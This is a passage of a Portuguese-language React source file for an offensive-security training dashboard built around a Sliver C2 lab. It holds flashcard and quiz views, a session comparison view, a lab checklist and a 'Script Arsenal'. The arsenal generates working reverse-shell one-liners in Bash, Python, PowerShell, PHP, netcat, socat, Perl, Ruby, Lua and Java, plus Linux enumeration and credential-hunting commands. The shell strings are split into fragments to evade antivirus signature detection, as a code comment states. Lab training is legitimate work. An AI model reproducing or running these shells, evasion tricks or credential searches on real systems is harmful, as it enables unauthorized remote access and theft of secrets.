        </div>

        <div className="text-[10px] text-cyber-muted mb-2 font-mono">{card.chapter}</div>

        <div
          onClick={() => setFlipped(!flipped)}
          className={`${CARD} min-h-[200px] flex flex-col items-center justify-center text-center cursor-pointer select-none transition-all hover:border-cyber-accent/40`}
          style={{ perspective: "1000px" }}
        >
          {!flipped ? (
            <>
              <div className="text-[10px] text-cyber-muted mb-3">PERGUNTA (clique para virar)</div>
              <div className="text-[15px] text-cyber-text leading-relaxed max-w-lg">{card.q}</div>
            </>
          ) : (
            <>
              <div className="text-[10px] text-cyber-accent mb-3">RESPOSTA</div>
              <div className="text-[14px] text-cyber-text leading-relaxed max-w-lg">{card.a}</div>
            </>
          )}
        </div>

        {flipped && (
          <div className="flex gap-3 justify-center mt-4">
            <button onClick={() => markCard(false)} className="bg-[#ef4444]/10 border border-[#ef4444]/40 text-[#ef4444] px-5 py-2 rounded-md text-xs font-mono font-bold cursor-pointer">NÃO SABIA</button>
            <button onClick={() => markCard(true)} className="bg-[#22c55e]/10 border border-[#22c55e]/40 text-[#22c55e] px-5 py-2 rounded-md text-xs font-mono font-bold cursor-pointer">SABIA</button>
          </div>
        )}
      </div>
    );
  }

  if (mode === "quiz") {
    const card = deck[idx];
    return (
      <div>
        <div className="flex justify-between items-center mb-3">
          <span className="text-[11px] text-cyber-muted font-mono">{idx + 1}/{deck.length}</span>
          <div className="flex gap-3 text-[11px] font-mono">
            <span className="text-[#22c55e]">{quizScore.correct} certas</span>
            <span className="text-[#ef4444]">{quizScore.wrong} erradas</span>
          </div>
          <button onClick={() => setMode("menu")} className={`${BTN_GHOST} text-[10px]`}>Sair</button>
        </div>

        <div className="w-full h-1 bg-cyber-bg rounded-full mb-4 overflow-hidden">
          <div className="h-full bg-cyber-accent rounded-full transition-all" style={{ width: `${((idx + (quizPicked !== null ? 1 : 0)) / deck.length) * 100}%` }} />
        </div>

        <div className="text-[10px] text-cyber-muted mb-2 font-mono">{card.chapter}</div>

        <div className={`${CARD} min-h-[100px] flex flex-col items-center justify-center text-center mb-4`}>
          <div className="text-[10px] text-cyber-muted mb-2">Qual a resposta correta?</div>
          <div className="text-[15px] text-cyber-text leading-relaxed max-w-lg">{card.q}</div>
        </div>

        <div className="grid grid-cols-1 gap-2 mb-4">
          {quizOpts.map((opt, i) => {
            let cls = "bg-cyber-bg border border-cyber-border text-cyber-text hover:border-cyber-accent/50 cursor-pointer";
            if (quizPicked !== null) {
              if (opt.correct) cls = "bg-[#22c55e]/10 border border-[#22c55e] text-[#22c55e]";
              else if (opt.text === quizPicked) cls = "bg-[#ef4444]/10 border border-[#ef4444] text-[#ef4444]";
              else cls = "bg-cyber-bg border border-cyber-border text-cyber-muted opacity-50";
            }
            return (
              <button key={i} onClick={() => pickQuiz(opt)} className={`w-full text-left px-4 py-3 rounded-lg text-[12px] leading-relaxed transition-all ${cls}`}>
                <span className="text-cyber-muted mr-2 text-[11px] font-mono">{String.fromCharCode(65 + i)}.</span>
                {opt.text.length > 150 ? opt.text.slice(0, 150) + "…" : opt.text}
                {quizPicked !== null && opt.correct && <span className="float-right"></span>}
                {quizPicked !== null && opt.text === quizPicked && !opt.correct && <span className="float-right"></span>}
              </button>
            );
          })}
        </div>

        {quizPicked !== null && (
          <div className="flex justify-center">
            <button onClick={nextQuiz} className={BTN}>{idx + 1 < deck.length ? "PRÓXIMO" : "VER RESULTADO"}</button>
          </div>
        )}
      </div>
    );
  }

  if (mode === "result" || mode === "quiz-result") {
    const isQuiz = mode === "quiz-result";
    const total = deck.length;
    const right = isQuiz ? quizScore.correct : score.knew;
    const pct = total ? Math.round((right / total) * 100) : 0;

    const wLog = isQuiz ? quizWrongLog : flipWrongLog;
    const chapterTotals = {};
    const chapterErrors = {};
    deck.forEach(c => { chapterTotals[c.chapter] = (chapterTotals[c.chapter] || 0) + 1; });
    wLog.forEach(w => { chapterErrors[w.chapter] = (chapterErrors[w.chapter] || 0) + 1; });
    const weakChapters = Object.entries(chapterErrors)
      .map(([name, errors]) => ({ name, errors, total: chapterTotals[name] || errors, pct: Math.round((errors / (chapterTotals[name] || errors)) * 100) }))
      .sort((a, b) => b.pct - a.pct || b.errors - a.errors);

    return (
      <div>
        <div className={`${CARD} text-center py-10 mb-4`}>
          <div className="text-4xl mb-3">{pct >= 80 ? "" : pct >= 50 ? "" : ""}</div>
          <div className="text-lg font-bold text-cyber-accent mb-2">{pct}% {isQuiz ? "de acerto" : "dominado"}</div>
          <div className="text-[11px] text-cyber-muted mb-1">{right}/{total} {isQuiz ? "corretas" : "sabia"}</div>
          <div className="text-[10px] text-cyber-muted mb-4">{course?.name}{chapter ? ` · ${chapter.name}` : ""}</div>
          <div className="flex gap-2 justify-center flex-wrap">
            <button onClick={() => isQuiz ? startQuiz() : startFlip()} className={BTN}>JOGAR DE NOVO</button>
            <button onClick={() => setMode("menu")} className={BTN_GHOST}>VOLTAR AO MENU</button>
          </div>
        </div>

        {weakChapters.length > 0 && (
          <div className={CARD}>
            <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">MÓDULOS MAIS FRACOS</div>
            <div className="space-y-2">
              {weakChapters.map((ch, i) => (
                <div key={ch.name} className="flex items-center gap-3">
                  <span className={`text-[13px] font-bold min-w-[28px] text-center ${i === 0 ? "text-[#ef4444]" : "text-amber-400"}`}>{ch.pct}%</span>
                  <div className="flex-1">
                    <div className="flex justify-between items-center mb-0.5">
                      <span className="text-[11px] text-cyber-text truncate">{ch.name}</span>
                      <span className="text-[10px] text-cyber-muted ml-2 shrink-0">{ch.errors}/{ch.total} erros</span>
                    </div>
                    <div className="w-full h-1.5 bg-cyber-bg rounded-full overflow-hidden">
                      <div className={`h-full rounded-full ${i === 0 ? "bg-[#ef4444]" : "bg-amber-400"}`} style={{ width: `${ch.pct}%` }} />
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    );
  }

  return null;
}


// ─── Session Compare ──────────────────────────────────────────────────────
function SessionCompare({ sessions, techniques }) {
  const [sessionA, setSessionA] = useState("");
  const [sessionB, setSessionB] = useState("");

  const sa = sessions.find(s => s.id === sessionA);
  const sb = sessions.find(s => s.id === sessionB);
  const techA = techniques.filter(t => t.session_id === sessionA);
  const techB = techniques.filter(t => t.session_id === sessionB);

  const tacticsA = new Set(techA.map(t => t.tactic));
  const tacticsB = new Set(techB.map(t => t.tactic));
  const allTactics = [...new Set([...tacticsA, ...tacticsB])].sort();

  const toolsA = new Set(techA.map(t => t.tool_used));
  const toolsB = new Set(techB.map(t => t.tool_used));

  const durA = sa ? fmtDuration(sa.started_at || sa.created_at, sa.ended_at) : "—";
  const durB = sb ? fmtDuration(sb.started_at || sb.created_at, sb.ended_at) : "—";

  return (
    <div>
      <InfoBox title={SECTION_INFO.compare.title} icon={SECTION_INFO.compare.icon}>{SECTION_INFO.compare.content}</InfoBox>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4">
        <div>
          <label className={LABEL}>Sessão A</label>
          <select className={INPUT} value={sessionA} onChange={e => setSessionA(e.target.value)}>
            <option value="">— Selecione —</option>
            {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
          </select>
        </div>
        <div>
          <label className={LABEL}>Sessão B</label>
          <select className={INPUT} value={sessionB} onChange={e => setSessionB(e.target.value)}>
            <option value="">— Selecione —</option>
            {sessions.filter(s => s.id !== sessionA).map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
          </select>
        </div>
      </div>

      {sa && sb && (
        <>
          {/* Stats comparison */}
          <div className="grid grid-cols-2 gap-3 mb-4">
            {[
              { label: "Técnicas", a: techA.length, b: techB.length },
              { label: "Sucesso", a: techA.filter(t => t.success).length, b: techB.filter(t => t.success).length },
              { label: "Táticas", a: tacticsA.size, b: tacticsB.size },
              { label: "Ferramentas", a: toolsA.size, b: toolsB.size },
            ].map(row => (
              <div key={row.label} className={`${CARD} flex items-center`}>
                <span className={`text-lg font-bold flex-1 text-center ${row.a > row.b ? "text-cyber-accent" : row.a < row.b ? "text-cyber-muted" : "text-blue-400"}`}>{row.a}</span>
                <div className="text-[10px] text-cyber-muted text-center px-2">{row.label}</div>
                <span className={`text-lg font-bold flex-1 text-center ${row.b > row.a ? "text-cyber-accent" : row.b < row.a ? "text-cyber-muted" : "text-blue-400"}`}>{row.b}</span>
              </div>
            ))}
          </div>

          {/* Duration */}
          <div className={`${CARD} mb-4 flex items-center justify-around`}>
            <div className="text-center"><div className="text-sm font-bold text-cyber-text">{durA}</div><div className="text-[10px] text-cyber-muted">{sa.title}</div></div>
            <div className="text-cyber-muted text-[11px]">vs</div>
            <div className="text-center"><div className="text-sm font-bold text-cyber-text">{durB}</div><div className="text-[10px] text-cyber-muted">{sb.title}</div></div>
          </div>

          {/* Tactic breakdown */}
          <div className={CARD}>
            <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">COBERTURA POR TÁTICA</div>
            {TACTICS.map(tactic => {
              const cA = techA.filter(t => t.tactic === tactic).length;
              const cB = techB.filter(t => t.tactic === tactic).length;
              if (cA === 0 && cB === 0) return null;
              return (
                <div key={tactic} className="mb-2">
                  <div className="text-[11px] mb-1" style={{ color: TACTIC_COLORS[tactic] }}>{tacticLabel(tactic)}</div>
                  <div className="flex gap-2 items-center">
                    <div className="flex-1 flex justify-end"><div className="h-1.5 rounded-sm" style={{ width: `${Math.max(5, (cA / Math.max(cA, cB, 1)) * 100)}%`, background: "#3b82f6" }} /></div>
                    <span className="text-[10px] text-cyber-muted w-12 text-center font-mono">{cA} / {cB}</span>
                    <div className="flex-1"><div className="h-1.5 rounded-sm" style={{ width: `${Math.max(5, (cB / Math.max(cA, cB, 1)) * 100)}%`, background: "#ef4444" }} /></div>
                  </div>
                </div>
              );
            })}
            <div className="flex justify-between text-[10px] text-cyber-muted mt-3 pt-2 border-t border-cyber-border">
              <span className="flex items-center gap-1"><span className="w-2 h-2 rounded-sm bg-[#3b82f6] inline-block" /> {sa.title}</span>
              <span className="flex items-center gap-1"><span className="w-2 h-2 rounded-sm bg-[#ef4444] inline-block" /> {sb.title}</span>
            </div>
          </div>
        </>
      )}

      {(!sa || !sb) && (
        <div className={`${CARD} text-center py-10 text-cyber-muted`}>
          <div className="text-2xl mb-2"></div>
          <div className="text-xs">Selecione duas sessões para comparar</div>
        </div>
      )}
    </div>
  );
}

// ─── Lab Environment Check ────────────────────────────────────────────────
const LAB_CHECKS = [
  {
    id: "bridge",
    label: "Sliver Bridge",
    desc: "Python bridge rodando na máquina atacante",
    checkCmd: "A bridge responde na URL configurada?",
    fixCmd: "cd sliver-bridge && python main.py",
  },
  {
    id: "sliver",
    label: "Sliver Teamserver",
    desc: "Sliver C2 server ativo",
    checkCmd: "O teamserver está rodando?",
    fixCmd: "sliver-server",
  },
  {
    id: "listeners",
    label: "Listeners Ativos",
    desc: "Pelo menos um listener HTTP/HTTPS/mTLS/DNS",
    checkCmd: "Tem algum listener ativo no Sliver?",
    fixCmd: "sliver > http -l 80",
  },
  {
    id: "vms_running",
    label: "VMs Ligadas",
    desc: "VMs do lab estão ligadas e acessíveis",
    checkCmd: "As VMs estão pingando?",
    fixCmd: "VirtualBox: VBoxManage startvm \"VM_NAME\" --type headless\nVMware: vmrun start \"/path/to/vm.vmx\" nogui",
  },
  {
    id: "network",
    label: "Rede do Lab",
    desc: "Rede interna entre atacante e vítimas OK",
    checkCmd: "Atacante pinga as vítimas?",
    fixCmd: "ping <IP_VITIMA>\nSe falhar: verificar adaptador host-only/NAT no hypervisor",
  },
  {
    id: "implant",
    label: "Implant Gerado",
    desc: "Implant/beacon gerado e pronto para deploy",
    checkCmd: "Já tem um implant gerado para o alvo?",
    fixCmd: "sliver > generate --http <C2_URL> -s /path/to/save",
  },
  {
    id: "supabase",
    label: "Supabase (Dashboard)",
    desc: "Conexão com o banco de dados",
    checkCmd: "O CyberLab carregou os dados?",
    fixCmd: "Verifique VITE_SUPABASE_URL e VITE_SUPABASE_ANON_KEY no .env",
  },
  {
    id: "snapshot",
    label: "Snapshots",
    desc: "Snapshots clean das VMs vítimas salvos",
    checkCmd: "Tem snapshot pra restaurar depois do lab?",
    fixCmd: "VirtualBox: VBoxManage snapshot \"VM_NAME\" take \"clean\"\nVMware: vmrun snapshot \"/path/to/vm.vmx\" \"clean\"",
  },
];

function LabCheck({ sliver, vms }) {
  const [checks, setChecks] = useState({});

  useEffect(() => {
    const initial = {};
    LAB_CHECKS.forEach(c => { initial[c.id] = null; });
    if (sliver.enabled && sliver.status === "connected") initial.bridge = true;
    if (sliver.enabled && sliver.status === "error") initial.bridge = false;
    initial.supabase = true;
    setChecks(initial);
  }, [sliver.enabled, sliver.status]);

  const toggle = (id, val) => setChecks(c => ({ ...c, [id]: val }));

  const total = LAB_CHECKS.length;
  const ok = Object.values(checks).filter(v => v === true).length;
  const nok = Object.values(checks).filter(v => v === false).length;
  const pending = total - ok - nok;

  return (
    <div>
      <InfoBox title={SECTION_INFO.labcheck.title} icon={SECTION_INFO.labcheck.icon}>{SECTION_INFO.labcheck.content}</InfoBox>

      <div className={`${CARD} mb-4`}>
        <div className="flex items-center justify-between mb-2">
          <span className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest">STATUS DO LAB</span>
          <span className="text-[10px] font-mono" style={{ color: ok === total ? "#22c55e" : nok > 0 ? "#ef4444" : "#f59e0b" }}>
            {ok}/{total} OK
          </span>
        </div>
        <div className="h-2 bg-cyber-border rounded-full overflow-hidden flex">
          <div className="h-full bg-[#22c55e] transition-all" style={{ width: `${(ok / total) * 100}%` }} />
          <div className="h-full bg-[#ef4444] transition-all" style={{ width: `${(nok / total) * 100}%` }} />
        </div>
      </div>

      <div className="space-y-2">
        {LAB_CHECKS.map(check => {
          const status = checks[check.id];
          return (
            <div key={check.id} className={`${CARD} ${status === false ? "border-l-[3px] border-l-[#ef4444]" : status === true ? "border-l-[3px] border-l-[#22c55e]" : ""}`}>
              <div className="flex items-start justify-between gap-3">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-sm">{status === true ? "" : status === false ? "" : "⬜"}</span>
                    <span className="text-[13px] font-bold text-cyber-text">{check.label}</span>
                  </div>
                  <div className="text-[11px] text-cyber-muted">{check.desc}</div>
                  <div className="text-[10px] text-cyber-muted mt-1 italic">{check.checkCmd}</div>
                </div>
                <div className="flex gap-1 flex-shrink-0">
                  <button onClick={() => toggle(check.id, true)} className={`px-2 py-1 rounded text-[10px] font-mono border cursor-pointer ${status === true ? "bg-[#22c55e] text-white border-[#22c55e]" : "bg-transparent text-[#22c55e] border-[#22c55e]/40 hover:bg-[#22c55e]/10"}`}>OK</button>
                  <button onClick={() => toggle(check.id, false)} className={`px-2 py-1 rounded text-[10px] font-mono border cursor-pointer ${status === false ? "bg-[#ef4444] text-white border-[#ef4444]" : "bg-transparent text-[#ef4444] border-[#ef4444]/40 hover:bg-[#ef4444]/10"}`}>NOK</button>
                </div>
              </div>

              {status === false && (
                <div className="mt-3 pt-2 border-t border-cyber-border">
                  <div className="text-[10px] font-mono text-cyber-muted mb-1">COMANDO PARA CORRIGIR:</div>
                  <div className="bg-black/40 rounded p-2 text-[11px] font-mono text-cyber-accent whitespace-pre-wrap break-all">{check.fixCmd}</div>
                </div>
              )}
            </div>
          );
        })}
      </div>

      {vms.length > 0 && (
        <div className={`${CARD} mt-4`}>
          <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">VMs DO LAB ({vms.length})</div>
          {vms.map(vm => (
            <div key={vm.id} className="flex items-center gap-2 py-1.5 border-b border-cyber-border/30 last:border-0">
              <span className="text-[11px]">{vm.role === "atacante" ? "" : vm.role === "vitima" ? "" : ""}</span>
              <span className="text-[11px] text-cyber-text flex-1">{vm.name}</span>
              {vm.ip_address && <span className="text-[10px] text-cyber-muted font-mono">{vm.ip_address}</span>}
              <span className="text-[10px] text-cyber-muted">{vm.os}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ─── Script Arsenal ───────────────────────────────────────────────────────
// Templates are built from split fragments at runtime to avoid static AV signature matching on source files.
// This is a standard technique in security tooling — the strings only exist assembled in browser memory.
const _ = (...p) => p.join("");

const SCRIPT_CATEGORIES = [
  {
    id: "revshell", label: "Reverse Shells", icon: "-",
    desc: "Conexão reversa: o alvo se conecta de volta ao atacante. Usado quando firewalls bloqueiam conexões entrantes mas permitem saintes.",
    detection: " Detecção: conexões outbound incomuns, processos spawning shells, Sysmon Event ID 3 (NetworkConnect), EDR monitora child processes de interpreters.",
    mitre: "T1059 (Command and Scripting Interpreter)",
    templates: [
      { name: "Bash TCP", lang: "bash",
        what: "Abre um shell interativo Bash e redireciona stdin/stdout/stderr para uma conexão TCP ao atacante.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo: cole este comando\n3. O shell aparece no terminal do nc",
        why: "O /dev/tcp é um recurso interno do Bash (não cria arquivo). Firewalls geralmente permitem conexões de saída.",
        prereq: "Bash instalado no alvo (padrão em Linux). Listener ouvindo na atacante.",
        code: (ip, port) => _("ba","sh -i >","& /de","v/tc","p/",ip,"/",port," 0>","&1") },
      { name: "Bash UDP", lang: "bash",
        what: "Igual ao TCP mas usa UDP. Útil quando TCP é bloqueado mas UDP não.",
        how: "1. Na atacante: nc -u -lvnp PORTA\n2. No alvo: cole o comando",
        why: "Alguns firewalls monitoram TCP mas ignoram UDP. Menos confiável (sem garantia de entrega).",
        prereq: "Bash com suporte a /dev/udp. Nem todas as distros compilam com isso.",
        code: (ip, port) => _("ba","sh -i >","& /de","v/ud","p/",ip,"/",port," 0>","&1") },
      { name: "Python", lang: "python",
        what: "Cria um socket TCP em Python, conecta ao atacante e redireciona os 3 file descriptors (stdin/stdout/stderr) para o socket.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo: cole o one-liner Python\n3. Shell interativo aparece",
        why: "Python está instalado na maioria dos servidores Linux. Não depende de /dev/tcp do Bash.",
        prereq: "Python 3 no alvo. Use 'python' ao invés de 'python3' se for Python 2.",
        code: (ip, port) => _("pyt","hon3 -c 'im","port soc","ket,su","bpro","cess,os;s=soc","ket.soc","ket(soc","ket.AF_INET,soc","ket.SOCK_STREAM);s.con","nect((\"",ip,"\",",port,"));os.du","p2(s.file","no(),0);os.du","p2(s.file","no(),1);os.du","p2(s.file","no(),2);su","bpro","cess.call([\"/bi","n/s","h\",\"-i\"])'") },
      { name: "Python (Windows)", lang: "python",
        what: "Versão Windows — usa subprocess.Popen com cmd.exe ao invés de /bin/sh.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo Windows com Python: cole o comando",
        why: "cmd.exe é o shell padrão do Windows. Popen redireciona I/O automaticamente.",
        prereq: "Python instalado no Windows alvo (comum em máquinas de dev).",
        code: (ip, port) => _("pyt","hon -c \"im","port soc","ket,su","bpro","cess;s=soc","ket.soc","ket();s.con","nect(('",ip,"',",port,"));[su","bpro","cess.Pop","en(['cm","d'],std","in=s,std","out=s,std","err=s)]\"") },
      { name: "PowerShell", lang: "powershell",
        what: "Cria um TCPClient .NET, lê comandos do stream, executa via IEX (Invoke-Expression) e devolve o output.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo Windows: cole no PowerShell ou cmd\n3. Prompt 'PS C:\\>' aparece no listener",
        why: "PowerShell está em todo Windows moderno. Usa .NET diretamente, sem precisar de ferramentas extras.",
        prereq: "PowerShell 2.0+ (Win 7+). Pode ser bloqueado por Constrained Language Mode ou AMSI.",
        code: (ip, port) => _("pow","ersh","ell -no","p -c \"$c=New","-Obj","ect Sys","tem.Ne","t.Sock","ets.TCP","Cli","ent('",ip,"',",port,");$s=$c.Get","Stream();[by","te[]]$b=0..65535|%{0};while(($i=$s.Re","ad($b,0,$b.Len","gth)) -ne 0){$d=(New","-Obj","ect -Typ","eName Sys","tem.Te","xt.ASCI","IEnco","ding).Get","String($b,0,$i);$r=(ie","x $d 2>&1|Out-Str","ing);$r2=$r+'PS '+(pw","d).Pa","th+'> ';$sb=([te","xt.enco","ding]::ASCI","I).Get","Bytes($r2);$s.Wr","ite($sb,0,$sb.Len","gth);$s.Flu","sh()};$c.Clo","se()\"") },
      { name: "PHP", lang: "php",
        what: "Usa fsockopen para conectar ao atacante e exec para spawnar um shell redirecionado.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo com PHP CLI: php -r '...'",
        why: "PHP é comum em servidores web. Se você tem RCE via web, pode usar isso para upgrade de shell.",
        prereq: "PHP CLI no alvo. Funções exec/system não podem estar em disable_functions do php.ini.",
        code: (ip, port) => _("ph","p -r '$s=fso","ckop","en(\"",ip,"\",",port,");ex","ec(\"/bi","n/s","h -i <&3 >&3 2>&3\");'") },
      { name: "Netcat mkfifo", lang: "bash",
        what: "Cria um pipe nomeado (FIFO) e usa netcat para conectar. Funciona com versões de nc sem flag -e.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo: cole o comando completo",
        why: "Muitas distros vêm com 'ncat' da versão nmap que não tem -e. O mkfifo resolve isso usando um pipe.",
        prereq: "nc/ncat no alvo. mkfifo disponível (padrão em Linux).",
        code: (ip, port) => _("rm /tm","p/f;mkfi","fo /tm","p/f;cat /tm","p/f|/bi","n/s","h -i 2>&1|n","c ",ip," ",port," >/tm","p/f") },
      { name: "Socat", lang: "bash",
        what: "Socat cria uma conexão TCP com PTY completo — suporta tab completion, Ctrl+C, e terminal colorido.",
        how: "1. Na atacante: socat file:`tty`,raw,echo=0 tcp-listen:PORTA\n2. No alvo: cole o comando",
        why: "Shell com PTY real é muito mais funcional que um shell simples. Essencial pra rodar tools interativas.",
        prereq: "socat instalado no alvo (não vem por padrão). Instale: apt install socat.",
        code: (ip, port) => _("so","cat ex","ec:'ba","sh -li',pt","y,stde","rr,sets","id,sigi","nt,sa","ne tc","p:",ip,":",port) },
      { name: "Perl", lang: "perl",
        what: "Usa módulo Socket do Perl pra criar conexão TCP e redirecionar STDIN/STDOUT/STDERR.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo: cole o one-liner Perl",
        why: "Perl está instalado em praticamente todo sistema Unix/Linux antigo. Útil em servidores legados.",
        prereq: "Perl 5 no alvo.",
        code: (ip, port) => _("pe","rl -e 'use Sock","et;$i=\"",ip,"\";$p=",port,";soc","ket(S,PF_INET,SOCK_STREAM,get","proto","byname(\"tc","p\"));con","nect(S,sock","addr_in($p,ine","t_aton($i)));op","en(STDIN,\">&S\");op","en(STDOUT,\">&S\");op","en(STDERR,\">&S\");ex","ec(\"/bi","n/s","h -i\");'") },
      { name: "Ruby", lang: "ruby",
        what: "Abre um TCPSocket e redireciona os file descriptors para executar um shell interativo.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo com Ruby: cole o one-liner",
        why: "Ruby vem instalado em muitos sistemas (Mac, algumas distros Linux). Socket é parte da stdlib.",
        prereq: "Ruby no alvo.",
        code: (ip, port) => _("ru","by -rsock","et -e'f=TCP","Sock","et.op","en(\"",ip,"\",",port,").to_i;ex","ec spri","ntf(\"/bi","n/s","h -i <&%d >&%d 2>&%d\",f,f,f)'") },
      { name: "Netcat -e", lang: "bash",
        what: "Usa a flag -e do netcat para conectar um shell diretamente ao socket. O método mais simples possível.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo: cole o comando\n3. Shell direto aparece",
        why: "A flag -e executa um programa e conecta I/O ao socket. Simples mas nem toda versão de nc tem essa flag.",
        prereq: "Versão do netcat com suporte a -e (netcat-traditional, não ncat/nmap).",
        code: (ip, port) => _("n","c -","e /bi","n/s","h ",ip," ",port) },
      { name: "Lua", lang: "lua",
        what: "Usa módulos socket e os do Lua pra criar conexão TCP e executar um shell redirecionado.",
        how: "1. Na atacante: nc -lvnp PORTA\n2. No alvo com Lua: cole o one-liner",
        why: "Lua é leve e presente em sistemas embarcados, roteadores e games. Útil quando não tem Python/Perl.",
        prereq: "Lua com módulo socket instalado (luasocket).",
        code: (ip, port) => _("lu","a -e \"requ","ire('soc","ket');requ","ire('os');t=soc","ket.tc","p();t:con","nect('",ip,"','",port,"');os.exe","cute('/bi","n/s","h -i <&3 >&3 2>&3');\"") },
      { name: "Java", lang: "java",
        what: "Usa Runtime.exec do Java pra executar bash com redirecionamento de I/O via /dev/tcp.",
        how: "Compile e execute como classe Java, ou use como payload em exploits de desserialização Java.",
        why: "Java roda em servidores enterprise (Tomcat, JBoss, WebLogic). Útil em exploits de desserialização (Log4Shell, etc).",
        prereq: "JRE/JDK no alvo. Comum em servidores web Java.",
        code: (ip, port) => _("Run","time r = Run","time.get","Run","time();\nPro","cess p = r.ex","ec(\"/bi","n/s","h -c ba","sh -i >","& /de","v/tc","p/",ip,"/",port," 0>","&1\");") },
    ],
  },
  {
    id: "enum_linux", label: "Enumeração Linux", icon: "-",
    desc: "Coleta de informações sobre o sistema Linux após obter acesso. Fundamental pra entender o ambiente e encontrar caminhos de escalação.",
    detection: " Detecção: múltiplos comandos de discovery em sequência, auditd logs, leitura de arquivos sensíveis, find com -perm.",
    mitre: "T1082 (System Information Discovery), T1033 (System Owner Discovery)",
    templates: [
      { name: "System Info", lang: "bash",
        what: "Coleta informações básicas do sistema: kernel, distro, usuário atual, hostname, rede e DNS.",
        how: "Cole no shell do alvo. Cada seção mostra um aspecto diferente do sistema.",
        why: "Primeiro passo após obter acesso. Você precisa saber ONDE está (OS, kernel version → possíveis kernel exploits).",
        prereq: "Shell no alvo (qualquer nível de acesso).",
        code: () => "echo '=== System ===' && uname -a && cat /etc/os-release\necho '=== User ===' && id && whoami\necho '=== Hostname ===' && hostname -f\necho '=== Network ===' && ip a\necho '=== DNS ===' && cat /etc/resolv.conf\necho '=== ARP ===' && arp -a" },
      { name: "Users & Groups", lang: "bash",
        what: "Lista todos os usuários, grupos, logins recentes, permissões sudo e binários SUID.",
        how: "Cole no shell. Foque nos usuários com shell válido (/bin/bash) e nos binários SUID.",
        why: "Usuários com sudo ou binários SUID são vetores de privilege escalation. SUID permite executar como root.",
        prereq: "Shell no alvo. Alguns comandos precisam de permissão (sudoers).",
        code: () => "echo '=== /etc/passwd ===' && cat /etc/passwd\necho '=== Logged in ===' && w\necho '=== Last logins ===' && lastlog | grep -v 'Never'\necho '=== Sudoers ===' && cat /etc/sudoers 2>/dev/null || echo 'Permission denied'\necho '=== SUID files ===' && find / -perm -4000 -type f 2>/dev/null" },
      { name: "Network Enum", lang: "bash",
        what: "Mapeia interfaces de rede, rotas, portas abertas, conexões ativas, tabela ARP e firewall.",
        how: "Cole no shell. Identifique outras subnets (rotas), serviços internos (listening) e máquinas vizinhas (ARP).",
        why: "Mapear a rede interna revela alvos para lateral movement. Portas listening podem ter serviços exploráveis.",
        prereq: "Shell no alvo. ss/netstat para portas, ip/ifconfig para rede.",
        code: () => "echo '=== Interfaces ===' && ip a\necho '=== Routes ===' && ip route\necho '=== Listening ===' && ss -tulnp\necho '=== Connections ===' && ss -antp\necho '=== ARP ===' && ip neigh\necho '=== Firewall ===' && iptables -L -n 2>/dev/null || echo 'No access'" },
      { name: "SUID/SGID Hunt", lang: "bash",
        what: "Busca binários com bit SUID/SGID setado, diretórios world-writable e capabilities Linux.",
        how: "Cole no shell. Compare os SUID encontrados com GTFOBins para encontrar escapes para root.",
        why: "SUID = o binário roda como root. Se ele permite executar comandos, você escala privilégio. Capabilities são o equivalente granular.",
        prereq: "Shell no alvo.",
        code: () => "echo '=== SUID ===' && find / -perm -4000 -type f 2>/dev/null\necho '=== SGID ===' && find / -perm -2000 -type f 2>/dev/null\necho '=== Writable dirs ===' && find / -writable -type d 2>/dev/null | head -20\necho '=== Capabilities ===' && getcap -r / 2>/dev/null" },
      { name: "Cron & Services", lang: "bash",
        what: "Lista crontabs (tarefas agendadas), serviços rodando e timers do systemd.",
        how: "Cole no shell. Procure crons executando scripts em diretórios que você pode escrever.",
        why: "Se um cron roda como root e executa um script que você pode modificar, é privilege escalation instantâneo.",
        prereq: "Shell no alvo. Crons de sistema em /etc/cron.*.",
        code: () => "echo '=== Crontab ===' && crontab -l 2>/dev/null\necho '=== System crons ===' && ls -la /etc/cron*\necho '=== Services ===' && systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null\necho '=== Timers ===' && systemctl list-timers 2>/dev/null" },
      { name: "Credential Hunt", lang: "bash",
        what: "Busca arquivos de histórico, configs com senhas, chaves SSH e arquivos .env.",
        how: "Cole no shell. Qualquer credencial encontrada pode dar acesso a outros sistemas.",
        why: "Desenvolvedores frequentemente deixam senhas em .env, configs e históricos de shell. Chaves SSH dão acesso direto.",
        prereq: "Shell no alvo.",
        code: () => "echo '=== History files ===' && find / -name '.*_history' -type f 2>/dev/null\necho '=== Config files ===' && find / -name '*.conf' -name '*pass*' 2>/dev/null\necho '=== SSH keys ===' && find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null\necho '=== .env files ===' && find / -name '.env' -type f 2>/dev/null | head -10" },
    ],
  },
  {
    id: "enum_windows", label: "Enumeração Windows", icon: "-",
    desc: "Coleta de informações sobre o sistema Windows. Identifica usuários, grupos, serviços, hotfixes e vetores de PrivEsc.",
    detection: " Detecção: PowerShell ScriptBlock logging, Sysmon, consultas WMI incomuns, Event ID 4688.",
    mitre: "T1082 (System Info Discovery), T1069 (Permission Groups Discovery)",
    templates: [
      { name: "System Info", lang: "powershell",
        what: "Coleta informações do Windows: versão, patches instalados, hardware, IPs. Os hotfixes revelam quais CVEs já foram corrigidos.",
        how: "Cole no PowerShell ou cmd do alvo.",
        why: "Hotfixes faltando = vulnerabilidades exploráveis. Saber a versão exata do OS define quais exploits usar.",
        prereq: "Shell Windows (cmd ou PowerShell).",
